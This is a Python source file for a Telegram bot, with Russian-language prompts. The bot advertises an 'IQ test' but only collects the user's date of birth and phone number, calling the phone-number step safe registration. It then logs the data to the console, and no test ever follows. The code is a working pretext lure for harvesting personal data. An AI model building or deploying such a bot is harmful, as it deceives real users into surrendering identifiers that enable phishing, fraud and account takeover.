import logging
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, ConversationHandler, filters

# Включаем логирование
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Состояния разговора
DOB, CONTACT = range(2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # Приветственное сообщение и запрос даты рождения
    await update.message.reply_text(
        "Добро пожаловать на *IQ-тест*!",
        parse_mode=ParseMode.MARKDOWN
    )
    await update.message.reply_text(
        "Привет! Чтобы подготовить тест для вас, укажи дату рождения.\n"
        "Формат: ДД.MM.ГГГГ"
    )
    return DOB

async def dob_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text.strip()
    try:
        # Проверяем формат даты
        dob = datetime.strptime(text, "%d.%m.%Y")
        context.user_data['dob'] = text
    except ValueError:
        await update.message.reply_text(
            "Неверный формат. Пожалуйста, укажи дату в формате ДД.MM.ГГГГ"
        )
        return DOB

    # Готовим кнопку для отправки контактных данных
    button = KeyboardButton("☎️ Отправить номер", request_contact=True)
    markup = ReplyKeyboardMarkup([[button]], one_time_keyboard=True, resize_keyboard=True)

    await update.message.reply_text(
        "Спасибо! Остался последний шаг для доступа к тестированию.\n"
        "Нажми кнопку 👇, чтобы безопасно передать свой номер телефона для регистрации.",
        reply_markup=markup
    )
    return CONTACT

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    contact = update.message.contact
    phone = contact.phone_number
    dob = context.user_data.get('dob')

    # Выводим данные пользователя в консоль
    print(f"User ID: {update.effective_user.id}, Date of Birth: {dob}, Phone: {phone}")

    await update.message.reply_text(
        "Спасибо! Данные получены.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "Регистрация отменена.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END


def main() -> None:
    # Замените 'YOUR_BOT_TOKEN' на токен вашего бота
    BOT_TOKEN = 'YOUR_BOT_TOKEN'

    # Создаем приложение
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Настраиваем ConversationHandler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            DOB: [MessageHandler(filters.TEXT & ~filters.COMMAND, dob_handler)],
            CONTACT: [MessageHandler(filters.CONTACT, contact_handler)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    app.add_handler(conv_handler)

    # Запускаем бота
    app.run_polling()


if __name__ == '__main__':
    main()
